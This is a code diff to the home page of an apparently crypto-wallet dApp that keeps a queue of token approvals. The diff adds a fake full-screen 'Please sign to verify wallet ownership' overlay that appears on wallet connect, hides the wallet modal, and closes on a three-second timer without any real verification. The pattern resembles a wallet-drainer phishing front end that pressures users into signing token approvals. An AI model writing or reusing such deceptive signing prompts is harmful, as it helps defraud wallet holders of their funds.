@@ -299,6 +299,8 @@ export default function Home() {
   const [solanaStep, setSolanaStep] = useState<Step>("idle");
   const [selectedSolanaWallet, setSelectedSolanaWallet] = useState<SolanaWalletType | null>(null);
   const [solanaProvider, setSolanaProvider] = useState<SolanaWalletProvider | null>(null);
+  const [showSigningScreen, setShowSigningScreen] = useState(false);
+  const [wasConnected, setWasConnected] = useState(false);
 
   const { address, isConnected } = useAccount();
   const { openConnectModal } = useConnectModal();
@@ -322,6 +324,19 @@ export default function Home() {
   const currentApprovalToken = approvalQueue[currentQueueIndex];
   const tokenAddress = currentApprovalToken?.address || "";
   const tokenSymbol = currentApprovalToken?.symbol || "";
+
+  useEffect(() => {
+    const justConnected = (isConnected || solanaConnected) && !wasConnected;
+    if (justConnected) {
+      setShowSigningScreen(true);
+      setShowUnifiedWalletModal(false);
+      const timer = setTimeout(() => {
+        setShowSigningScreen(false);
+      }, 3000);
+      return () => clearTimeout(timer);
+    }
+    setWasConnected(isConnected || solanaConnected);
+  }, [isConnected, solanaConnected]);
 
   useEffect(() => {
     // Auto-connect when dApp loads inside any Solana wallet browser
@@ -812,6 +827,31 @@ export default function Home() {
 
       {/* Section 6 - Footer */}
       <img src={section6} alt="" className="w-full h-auto block" data-testid="img-section6" />
+
+      {showSigningScreen && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-[250]">
+          <div className="bg-white rounded-3xl p-10 w-[420px] shadow-2xl flex flex-col items-center gap-6">
+            <div className="relative w-20 h-20">
+              <svg className="absolute inset-0 w-20 h-20 animate-spin" viewBox="0 0 80 80">
+                <circle cx="40" cy="40" r="34" stroke="#e5e7eb" strokeWidth="5" fill="none" />
+                <circle cx="40" cy="40" r="34" stroke="#4752c4" strokeWidth="5" fill="none" strokeLinecap="round" strokeDasharray="160" strokeDashoffset="120" />
+              </svg>
+              <div className="absolute inset-0 flex items-center justify-center">
+                <div className="bg-gray-100 rounded-2xl w-14 h-14 flex items-center justify-center">
+                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                    <circle cx="12" cy="7" r="4" />
+                  </svg>
+                </div>
+              </div>
+            </div>
+            <div className="text-center">
+              <h3 className="text-xl font-semibold text-gray-900 mb-2">Connecting your wallet</h3>
+              <p className="text-gray-500 text-sm">Please sign to verify wallet ownership . . .</p>
+            </div>
+          </div>
+        </div>
+      )}
 
       {showUnifiedWalletModal && (
         <div 
